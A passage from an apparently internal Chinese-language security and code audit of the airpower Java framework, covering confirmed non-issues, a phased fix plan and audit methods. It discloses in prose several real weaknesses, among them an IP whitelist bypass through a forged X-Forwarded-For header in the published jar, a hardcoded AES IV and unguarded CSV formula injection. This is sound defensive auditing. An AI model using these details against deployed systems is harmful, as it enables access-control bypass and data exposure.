    `ObjectInputStream`、SpEL 拼接；唯一的反射调用目标集合是启动期白名单固定的。
30. **开放平台的 IP 白名单不能靠伪造请求头绕过（但注意版本）**。已发布的 `airpower-api 8.0.1` jar 里的 `getIpAddress`
    确实是无条件信任 `X-Forwarded-For`（**真漏洞**）；仓库 HEAD 上（`40d5b672`）已修复 —— 只有 TCP 对端命中 `trustedProxies`
    时才解析代理头，且自右向左剥离可信节点，默认值仅 `127.0.0.1/32` 与 `::1/128`。**而现在能下载到的仍是漏洞版本**，修完
    P0-1 发版时要一并覆盖这条。
31. **`OpenArithmeticType` 不需要 `equals`，`switch` 不会失效**。审计清单里假设过这个问题，实测不成立：`switch` 对枚举用
    `==` 比较单例常量；`DictionaryUtil.getDictionary` 内部用 `getEnumConstants()` + `findFirst().orElseThrow(...)`，找不到时
    **抛异常而不是返回 null**。
32. **`appSecret` 不会通过响应回给调用方**。`OpenResponse.encodeResponse` 只序列化业务 data，不碰 openApp。
33. **`OpenApiAspect` 切面本身不吞异常**。没有 try-catch 包裹 `proceed()`，业务方法抛的异常正常向上传播。
34. **没有通配符订阅导致的消息风暴**。全模块零处使用 `+` 或 `#`（`Docs.md` 里的只是文档示例）。
35. **MCP 没有 JSON 多态反序列化（gadget）风险**。`Json.parse(str, Class)` 传的是具体 Class，ObjectMapper 未开 default
    typing。

---

## 五、建议的修复节奏

| 批次            | 内容                                                                                     | 预期                                                    |
|---------------|----------------------------------------------------------------------------------------|-------------------------------------------------------|
| **第 1 批（今天）** | P0-1 编译、P0-2 拦截器装配、P0-3 日志脱敏、P0-4/5 路径校验、**P0-8 删那行日志**                                | 5 个安全/构建问题一次性收敛。注意 **P0-2 与 P0-3 必须同批**（修好过滤器才会读到请求体） |
| **第 2 批**     | P0-7 `withNull`、B1 钩子双执行、B2 `clear()`、B3 `getList` 上限                                  | 框架的写路径才敢放心用                                           |
| **第 3 批**     | P1 鉴权组（A1~A4）、Redis 组（D1/D2/D3/D4）                                                     | 权限模型自洽、缓存与锁可用                                         |
| **第 4 批**     | P0-9 换 GCM、P0-10 补 `@within`、J9/J10/J11 签名加固                                           | 开放平台从"名义加密"变成真加密                                      |
| **第 5 批**     | P1 WebSocket/MQTT（E1~E7）、导出链路（B4/B5/B6）                                                | MQTT 模式可用、泄漏止住、导出提速                                   |
| **第 6 批**     | P1 AI/MCP（J1/J2/J5/J6）                                                                 | 工具调用不再串参、失败不再伪装成成功                                    |
| **第 7 批**     | P2 清理 + I1 补测试 + I2 补 CI/enforcer                                                      | 防止同类问题再次发生                                            |
| **长期**        | F2 去掉 jar 内 `logback-spring.xml`、I4 依赖 optional 化、I5 版本/tag 治理、J14 推动 core 修 `AesUtil` | 库的基本礼貌                                                |

> 补测试的优先级建议：`saveToDatabase(entity, true)` 的字段保留行为、钩子调用次数、`getList` 的条数上限、文件路径守卫、邮件标题注入、MCP
> 工具参数绑定 —— 这 6 个直接对应本文档的 P0/P1，且都是纯单元测试可覆盖，不需要起 Spring 容器。

---

## 六、方法与免责

- **主审已实证**（有命令输出或字节码为证）：P0-1（`mvn clean compile` 实测 BUILD FAILURE + `javap` 核
  `HttpConstant$Proxy$Header` 只有 5 个常量）、P0-2（全仓 grep
  `addInterceptors|InterceptorRegistry|WebMvcConfigurer|FilterRegistrationBean|ServletComponentScan` 零命中 + 读
  `Docs.md:296`）、P0-3（读 `ApiConfig` 默认值 + `printLog` 实现）、P0-4/5（读 `getUploadDirectory` / `LocalFileHelper.delete`
  实现）、P0-6（读 `EmailHelper.setSubject`）、P0-7（逐行跟踪 `saveToDatabase` 的 `withNull` 分支）、P0-8（读到 `log.info` 直接打
  `source` 明文）、P0-9（`javap` 读出 IV 硬编码 `"0000000000000000"` + CBC/PKCS5 + `cipherCache` 复用）、P0-10（读到切点
  `@annotation` 与 `@Target(FIELD,METHOD,TYPE)` 矛盾）、B1~B6（读 `CurdController` / `CurdService` 双份钩子与导出递归）、C1（
  `grep` 确认 `validateUploadFileExtension` 零调用点）、C3/C5（读源码）、E1~E7（读 `WebSocketHandler` / `RedisPubSubConfig` /
  `WebSocketHelper`）、F2（`md5` 比对 11 份 + 解压本地仓库 8.0.1 全部 jar 确认）、I1~I6（文件系统与 POM 实证）、第四节全部 35 条（
  `javap` 读 core 字节码 + `unzip -l` 读历史 jar）。
- **来自子代理走读、主审未逐行复核**：标 ⚠️ 的条目。定级与描述建议修复前再看一眼代码；其中 **A1~A4（权限标识算法 / 接口注解 /
  默认放行 / 扫描漏映射）** 与 **J1/J2（MCP 工具参数串位、异常伪装成成功）** 影响面最大，建议优先安排一次针对性复审。
- **已知的报告冲突及裁决**：base 报告曾断言"CSV 公式注入已被 `CollectionUtil.guardFormula` 防护"，curd 报告则指控无防护 ——
  主审用 `javap` 读了 `airpower-core-7.0.0` 的字节码裁决为**无防护**（字符串常量只有 `,`、`-`、`\n`、`是`、`否`，全程 2 处
  `String.replace`，无 `'` 前缀、无 `=` 判断），已按此写入第七节第 7 条。同理，一次 `mvn compile` 曾因 `target/` 里有旧 class
  而误报"BUILD SUCCESS"，主审重跑 `clean compile` 后推翻了它 —— 这就是 P0-1 被抓到的原因。
- **未覆盖**：`airpower-core 7.0.0` 是外部依赖（本地仓库只有 class 无源码），本文档中涉及 core 行为的结论均以 `javap`
  字节码为准，其中 J14（`AesUtil` 复用非线程安全 `Cipher`）需要 core 仓库侧修复。
